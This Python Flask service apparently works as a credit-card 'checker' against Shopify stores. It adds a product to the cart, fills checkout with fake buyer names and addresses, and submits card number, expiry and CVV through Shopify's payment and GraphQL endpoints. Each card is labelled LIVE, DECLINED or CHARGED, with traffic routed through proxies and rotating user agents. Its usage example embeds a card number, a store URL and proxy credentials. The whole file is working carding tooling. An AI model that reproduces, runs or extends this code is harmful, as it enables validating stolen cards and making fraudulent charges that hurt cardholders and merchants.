from flask import Flask, request, jsonify
import asyncio
import random
from fake_useragent import UserAgent
import httpx
import re
import json
from urllib.parse import urlparse
import sys
import os
import time

app = Flask(__name__)

try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass

def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

class ShopifyAuto:
    def __init__(self, proxy=None):
        self.user_agent = UserAgent().random
        self.proxy = proxy
    
    async def get_random_info(self):
        """Get random user info with VALID addresses"""
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"}
        ]
        
        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        
        valid_phones = [
            "2025550199", "3105551234", "4155559876", "6175550123",
            "9718081573", "2125559999", "7735551212", "4085556789"
        ]
        phone = random.choice(valid_phones)
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

async def process_payment(site_url, cc, mon, year, cvv, proxy_raw=None):
    """Process payment and return results"""
    start_time = time.time()
    
    # إعداد البروكسي بالشكل الصحيح
    proxies = None
    proxy_status = "Dead"
    
    if proxy_raw:
        try:
            # تشكيلات مختلفة للبروكسي
            if '@' in proxy_raw:
                # بالفعل بالشكل http://user:pass@ip:port
                if not proxy_raw.startswith('http'):
                    proxy_raw = f"http://{proxy_raw}"
            elif ':' in proxy_raw:
                parts = proxy_raw.split(':')
                if len(parts) == 4:
                    # ip:port:user:pass
                    ip, port, user, pwd = parts
                    proxy_raw = f"http://{user}:{pwd}@{ip}:{port}"
                elif len(parts) == 2:
                    # ip:port فقط
                    proxy_raw = f"http://{proxy_raw}"
                else:
                    # شكل غير معروف
                    proxy_raw = f"http://{proxy_raw}"
            
            proxies = {
                "http://": proxy_raw,
                "https://": proxy_raw
            }
        except Exception as e:
            pass
    
    try:
        async with httpx.AsyncClient(follow_redirects=True, timeout=60.0, proxies=proxies, verify=False) as session:
            shop = ShopifyAuto(proxy=proxy_raw)
            
            # Test proxy if provided
            if proxy_raw:
                try:
                    test_response = await session.get("http://httpbin.org/ip", timeout=10.0)
                    if test_response.status_code == 200:
                        proxy_status = "Live"
                except:
                    proxy_status = "Dead"
            
            # Step 1: Get product info
            product_header = {
                'accept': 'text/html,application/xhtml+xml',
                'user-agent': shop.user_agent,
            }
            
            try:
                product_response = await session.get(f'{site_url}/products.json', headers=product_header)
                products_data = product_response.json()
                product = products_data['products'][0]
                variant_id = product['variants'][0]['id']
                price = product['variants'][0]['price']
                product_handle = product['handle']
            except Exception as e:
                elapsed_time = f"{time.time() - start_time:.1f}s"
                return {
                    "Gateway": "Shopify Payments",
                    "CC": f"{cc}|{mon}|{year}|{cvv}",
                    "Response": f"❌ Error fetching product: {str(e)[:100]}",
                    "Price": "N/A",
                    "Proxy": proxy_status,
                    "Time": elapsed_time,
                    "By": "@hhhiqh"
                }
            
            # Step 2: Visit product page for cookies
            try:
                await session.get(f"{site_url}/products/{product_handle}", headers=product_header)
            except Exception as e:
                pass
            
            # Step 3: Add to cart
            await session.get(f'{site_url}/cart.js', headers=product_header)
            add_data = {'id': str(variant_id), 'quantity': '1', 'form_type': 'product'}
            cart_response = await session.post(f'{site_url}/cart/add.js', headers=product_header, data=add_data)
            
            if cart_response.status_code != 200:
                elapsed_time = f"{time.time() - start_time:.1f}s"
                return {
                    "Gateway": "Shopify Payments",
                    "CC": f"{cc}|{mon}|{year}|{cvv}",
                    "Response": f"❌ Failed to add item to cart",
                    "Price": f"${price}",
                    "Proxy": proxy_status,
                    "Time": elapsed_time,
                    "By": "@hhhiqh"
                }
                
            # Step 4: Get cart token
            cart_data = (await session.get(f"{site_url}/cart.js", headers=product_header)).json()
            token = cart_data['token']
            
            # Step 5: Go to checkout
            checkout_headers = {
                'accept': 'text/html,application/xhtml+xml',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': site_url,
                'referer': f"{site_url}/cart",
                'user-agent': UserAgent().random,
            }
            
            await session.get(f"{site_url}/checkout", headers=checkout_headers)
            checkout_response = await session.post(
                f"{site_url}/cart", 
                headers=checkout_headers, 
                data={'checkout': '', 'updates[]': '1'}
            )
            response_text = checkout_response.text
            
            # Step 6: Extract tokens
            session_token_match = re.search(
                r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', 
                response_text
            )
            
            if not session_token_match:
                elapsed_time = f"{time.time() - start_time:.1f}s"
                return {
                    "Gateway": "Shopify Payments",
                    "CC": f"{cc}|{mon}|{year}|{cvv}",
                    "Response": "❌ Failed to extract checkout tokens",
                    "Price": f"${price}",
                    "Proxy": proxy_status,
                    "Time": elapsed_time,
                    "By": "@hhhiqh"
                }
                
            session_token = session_token_match.group(1)
            queue_token = find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
            stable_id = find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
            paymentMethodIdentifier = find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            
            # Step 7: Get random info
            random_info = await shop.get_random_info()
            fname, lname = random_info["fname"], random_info["lname"]
            email_addr = random_info["email"]
            phone = random_info["phone"]
            add1, city, state_short, zip_code = random_info["add1"], random_info["city"], random_info["state_short"], str(random_info["zip"])
            
            # Step 8: Create payment session
            session_created = False
            sessionid = None
            session_endpoints = [
                "https://deposit.us.shopifycs.com/sessions",
                "https://checkout.shopifycs.com/sessions"
            ]
            
            last_session_error = ""
            for endpoint in session_endpoints:
                try:
                    headers = {
                        'authority': urlparse(endpoint).netloc,
                        'accept': 'application/json',
                        'content-type': 'application/json',
                        'origin': 'https://checkout.shopifycs.com',
                        'user-agent': shop.user_agent,
                    }
                    
                    json_data = {
                        'credit_card': {
                            'number': cc,
                            'month': mon,
                            'year': year,
                            'verification_value': cvv,
                            'name': f'{fname} {lname}',
                        },
                        'payment_session_scope': urlparse(site_url).netloc,
                    }
                    
                    session_response = await session.post(endpoint, headers=headers, json=json_data)
                    
                    if session_response.status_code == 200:
                        session_data = session_response.json()
                        if "id" in session_data:
                            sessionid = session_data["id"]
                            session_created = True
                            break
                    elif session_response.status_code == 400:
                        last_session_error = session_response.text
                except Exception as e:
                    last_session_error = str(e)
                    continue
            
            if not session_created:
                elapsed_time = f"{time.time() - start_time:.1f}s"
                
                # Check if card is live or dead based on error
                response_msg = "❌ Dead Proxy / Card Check Failed"
                if "invalid" in last_session_error.lower() or "decline" in last_session_error.lower():
                    response_msg = "❌ DECLINED - Invalid Card"
                elif "insufficient" in last_session_error.lower():
                    response_msg = "✅ LIVE - Insufficient Funds"
                elif "test mode" in last_session_error.lower():
                    response_msg = "✅ LIVE - Test Mode Card"
                
                return {
                    "Gateway": "Shopify Payments",
                    "CC": f"{cc}|{mon}|{year}|{cvv}",
                    "Response": response_msg,
                    "Price": f"${price}",
                    "Proxy": proxy_status,
                    "Time": elapsed_time,
                    "By": "@hhhiqh"
                }
            
            # Step 9: Submit payment via GraphQL
            graphql_url = f"{site_url}/checkouts/unstable/graphql"
            random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
            
            graphql_headers = {
                'authority': urlparse(site_url).netloc,
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': site_url,
                'referer': f"{site_url}/",
                'user-agent': UserAgent().random,
                'x-checkout-one-session-token': session_token,
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-source-id': token,
            }
            
            graphql_payload = {
                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}',
                'variables': {
                    'input': {
                        'checkpointData': None,
                        'sessionInput': {
                            'sessionToken': session_token,
                        },
                        'queueToken': queue_token,
                        'discounts': {
                            'lines': [],
                            'acceptUnexpectedDiscounts': True,
                        },
                        'delivery': {
                            'deliveryLines': [
                                {
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True},
                                        },
                                        'options': {},
                                    },
                                    'targetMerchandiseLines': {
                                        'lines': [{'stableId': stable_id}],
                                    },
                                    'destination': {
                                        'streetAddress': {
                                            'address1': add1,
                                            'address2': '',
                                            'city': city,
                                            'countryCode': 'US',
                                            'postalCode': zip_code,
                                            'company': '',
                                            'firstName': fname,
                                            'lastName': lname,
                                            'zoneCode': state_short,
                                            'phone': phone,
                                        },
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': True,
                                },
                            ],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': False,
                            'prefetchShippingRatesStrategy': None,
                        },
                        'merchandise': {
                            'merchandiseLines': [
                                {
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True},
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                },
                            ],
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [
                                {
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': paymentMethodIdentifier,
                                            'sessionId': sessionid,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': add1,
                                                    'address2': '',
                                                    'city': city,
                                                    'countryCode': 'US',
                                                    'postalCode': zip_code,
                                                    'company': '',
                                                    'firstName': fname,
                                                    'lastName': lname,
                                                    'zoneCode': state_short,
                                                    'phone': phone,
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                    },
                                    'amount': {'any': True},
                                    'dueAt': None,
                                },
                            ],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': add1,
                                    'address2': '',
                                    'city': city,
                                    'countryCode': 'US',
                                    'postalCode': zip_code,
                                    'company': '',
                                    'firstName': fname,
                                    'lastName': lname,
                                    'zoneCode': state_short,
                                    'phone': phone,
                                },
                            },
                        },
                        'buyerIdentity': {
                            'buyerIdentity': {
                                'presentmentCurrency': 'USD',
                                'countryCode': 'US',
                            },
                            'contactInfoV2': {
                                'emailOrSms': {
                                    'value': email_addr,
                                    'emailOrSmsChanged': False,
                                },
                            },
                            'marketingConsent': [{'email': {'value': email_addr}}],
                            'shopPayOptInPhone': {'countryCode': 'US'},
                        },
                        'tip': {'tipLines': []},
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                            'proposedTotalIncludedAmount': None,
                            'proposedMixedStateTotalAmount': None,
                            'proposedExemptions': [],
                        },
                        'note': {'message': None, 'customAttributes': []},
                        'localizationExtension': {'fields': []},
                        'nonNegotiableTerms': None,
                        'scriptFingerprint': {
                            'signature': None,
                            'signatureUuid': None,
                            'lineItemScriptChanges': [],
                            'paymentScriptChanges': [],
                            'shippingScriptChanges': [],
                        },
                        'optionalDuties': {'buyerRefusesDuties': False},
                    },
                    'attemptToken': f'{token}-{random.random()}',
                    'metafields': [],
                    'postPurchaseInquiryResult': None,
                    'analytics': {
                        'requestUrl': f'{site_url}/checkouts/cn/{token}',
                        'pageId': random_page_id,
                    },
                },
                'operationName': 'SubmitForCompletion',
            }

            # First attempt
            graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
            
            if graphql_response.status_code != 200:
                elapsed_time = f"{time.time() - start_time:.1f}s"
                return {
                    "Gateway": "Shopify Payments",
                    "CC": f"{cc}|{mon}|{year}|{cvv}",
                    "Response": f"❌ Payment Error: HTTP {graphql_response.status_code}",
                    "Price": f"${price}",
                    "Proxy": proxy_status,
                    "Time": elapsed_time,
                    "By": "@hhhiqh"
                }
                
            result_data = graphql_response.json()
            completion = result_data.get('data', {}).get('submitForCompletion', {})
            
            # Check for soft errors and retry
            soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
            
            if completion.get('errors'):
                errors = completion['errors']
                error_codes = [e.get('code') for e in errors if 'code' in e]
                
                # Check if all errors are soft errors
                only_soft_errors = all(code in soft_errors for code in error_codes)
                
                if only_soft_errors:
                    # Retry once for soft errors
                    await asyncio.sleep(2)
                    graphql_payload['variables']['attemptToken'] = f'{token}-{random.random()}'
                    graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                    
                    if graphql_response.status_code == 200:
                        result_data = graphql_response.json()
                        completion = result_data.get('data', {}).get('submitForCompletion', {})
                    else:
                        elapsed_time = f"{time.time() - start_time:.1f}s"
                        return {
                            "Gateway": "Shopify Payments",
                            "CC": f"{cc}|{mon}|{year}|{cvv}",
                            "Response": "❌ Retry Failed",
                            "Price": f"${price}",
                            "Proxy": proxy_status,
                            "Time": elapsed_time,
                            "By": "@hhhiqh"
                        }
                else:
                    # Hard errors - card declined
                    non_soft_errors = [code for code in error_codes if code not in soft_errors]
                    elapsed_time = f"{time.time() - start_time:.1f}s"
                    
                    response_text = "❌ DECLINED"
                    if "INVALID" in str(error_codes).upper():
                        response_text = "❌ DECLINED - Invalid Card Number"
                    elif "INSUFFICIENT" in str(error_codes).upper():
                        response_text = "✅ LIVE - Insufficient Funds"
                    elif "GENERIC" in str(error_codes).upper():
                        response_text = "❌ DECLINED - Generic Decline"
                    elif "AVS" in str(error_codes).upper():
                        response_text = "❌ DECLINED - AVS Mismatch"
                    elif "CVC" in str(error_codes).upper() or "CVV" in str(error_codes).upper():
                        response_text = "❌ DECLINED - CVV Mismatch"
                    else:
                        response_text = f"❌ DECLINED - {', '.join(non_soft_errors)}"
                    
                    return {
                        "Gateway": "Shopify Payments",
                        "CC": f"{cc}|{mon}|{year}|{cvv}",
                        "Response": response_text,
                        "Price": f"${price}",
                        "Proxy": proxy_status,
                        "Time": elapsed_time,
                        "By": "@hhhiqh"
                    }
            
            if completion.get('reason'):
                elapsed_time = f"{time.time() - start_time:.1f}s"
                reason = completion['reason']
                
                response_text = f"❌ FAILED - {reason}"
                if "test" in str(reason).lower():
                    response_text = "✅ LIVE - Test Mode Card"
                    
                return {
                    "Gateway": "Shopify Payments",
                    "CC": f"{cc}|{mon}|{year}|{cvv}",
                    "Response": response_text,
                    "Price": f"${price}",
                    "Proxy": proxy_status,
                    "Time": elapsed_time,
                    "By": "@hhhiqh"
                }
            
            # Check receipt
            if completion.get('receipt'):
                receipt_id = completion['receipt'].get('id')
                
                # Poll for final result
                for poll_attempt in range(8):
                    await asyncio.sleep(2)
                    
                    poll_payload = {
                        'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}',
                        'variables': {
                            'receiptId': receipt_id,
                            'sessionToken': session_token,
                        },
                        'operationName': 'PollForReceipt'
                    }
                    
                    poll_response = await session.post(graphql_url, headers=graphql_headers, json=poll_payload)
                    
                    if poll_response.status_code == 200:
                        poll_data = poll_response.json()
                        receipt = poll_data.get('data', {}).get('receipt', {})
                        typename = receipt.get('__typename', '')
                        
                        elapsed_time = f"{time.time() - start_time:.1f}s"
                        
                        if typename == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                            order_id = receipt.get('orderIdentity', {}).get('id', 'N/A')
                            return {
                                "Gateway": "Shopify Payments",
                                "CC": f"{cc}|{mon}|{year}|{cvv}",
                                "Response": f"✅ CHARGED SUCCESSFULLY - Order: {order_id}",
                                "Price": f"${price}",
                                "Proxy": proxy_status,
                                "Time": elapsed_time,
                                "By": "@hhhiqh"
                            }
                        elif typename == 'ActionRequiredReceipt':
                            return {
                                "Gateway": "Shopify Payments",
                                "CC": f"{cc}|{mon}|{year}|{cvv}",
                                "Response": "✅ LIVE - 3D Secure Required",
                                "Price": f"${price}",
                                "Proxy": proxy_status,
                                "Time": elapsed_time,
                                "By": "@hhhiqh"
                            }
                        elif typename == 'FailedReceipt':
                            error_info = receipt.get('processingError', {})
                            error_code = error_info.get('code', 'Unknown')
                            
                            response_text = f"❌ DECLINED - {error_code}"
                            if "insufficient" in str(error_info).lower():
                                response_text = "✅ LIVE - Insufficient Funds"
                            elif "invalid" in str(error_info).lower():
                                response_text = "❌ DECLINED - Invalid Card"
                            elif "stolen" in str(error_info).lower() or "pickup" in str(error_info).lower():
                                response_text = "❌ DECLINED - Pickup Card"
                            elif "test" in str(error_info).lower():
                                response_text = "✅ LIVE - Test Mode"
                            
                            return {
                                "Gateway": "Shopify Payments",
                                "CC": f"{cc}|{mon}|{year}|{cvv}",
                                "Response": response_text,
                                "Price": f"${price}",
                                "Proxy": proxy_status,
                                "Time": elapsed_time,
                                "By": "@hhhiqh"
                            }
                
                # Timeout after polling
                elapsed_time = f"{time.time() - start_time:.1f}s"
                return {
                    "Gateway": "Shopify Payments",
                    "CC": f"{cc}|{mon}|{year}|{cvv}",
                    "Response": "⏱️ Timeout - Unknown Status",
                    "Price": f"${price}",
                    "Proxy": proxy_status,
                    "Time": elapsed_time,
                    "By": "@hhhiqh"
                }
            else:
                elapsed_time = f"{time.time() - start_time:.1f}s"
                return {
                    "Gateway": "Shopify Payments",
                    "CC": f"{cc}|{mon}|{year}|{cvv}",
                    "Response": "⚠️ No Receipt - Unknown Status",
                    "Price": f"${price}",
                    "Proxy": proxy_status,
                    "Time": elapsed_time,
                    "By": "@hhhiqh"
                }
                
    except Exception as e:
        elapsed_time = f"{time.time() - start_time:.1f}s"
        return {
            "Gateway": "Shopify Payments",
            "CC": f"{cc}|{mon}|{year}|{cvv}",
            "Response": f"❌ Error: {str(e)[:100]}",
            "Price": "N/A",
            "Proxy": proxy_status,
            "Time": elapsed_time,
            "By": "@hhhiqh"
        }

@app.route('/')
def home():
    return jsonify({
        "Gateway": "Shopify Payments",
        "Usage": "/shopify_checker?site=SITE_URL&cc=CC|MM|YY|CVV&proxy=IP:PORT:USER:PASS",
        "Example": "/shopify_checker?site=https://ferrierdesigns.myshopify.com&cc=5417559000138744|10|28|535&proxy=104.239.107.47:5699:wzwpqnjh:s7fuv03xpq4e",
        "By": "@hhhiqh"
    })

@app.route('/shopify_checker')
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_data = request.args.get('cc')
        proxy = request.args.get('proxy')
        
        if not site or not cc_data:
            return jsonify({
                "Gateway": "Shopify Payments",
                "CC": "Error",
                "Response": "Missing parameters",
                "Price": "N/A",
                "Proxy": "N/A",
                "Time": "0s",
                "By": "@hhhiqh",
                "Usage": "/shopify_checker?site=SITE_URL&cc=CC|MM|YY|CVV&proxy=IP:PORT:USER:PASS"
            }), 400
        
        # Parse card data
        try:
            cc, mon, year, cvv = cc_data.split('|')
        except:
            return jsonify({
                "Gateway": "Shopify Payments",
                "CC": cc_data,
                "Response": "Invalid card format. Use: CC|MM|YY|CVV",
                "Price": "N/A",
                "Proxy": "N/A",
                "Time": "0s",
                "By": "@hhhiqh"
            }), 400
        
        # Run async function
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(process_payment(site, cc, mon, year, cvv, proxy))
        loop.close()
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "Gateway": "Shopify Payments",
            "CC": cc_data if 'cc_data' in locals() else "N/A",
            "Response": f"❌ Server Error: {str(e)}",
            "Price": "N/A",
            "Proxy": "N/A",
            "Time": "0s",
            "By": "@hhhiqh"
        }), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
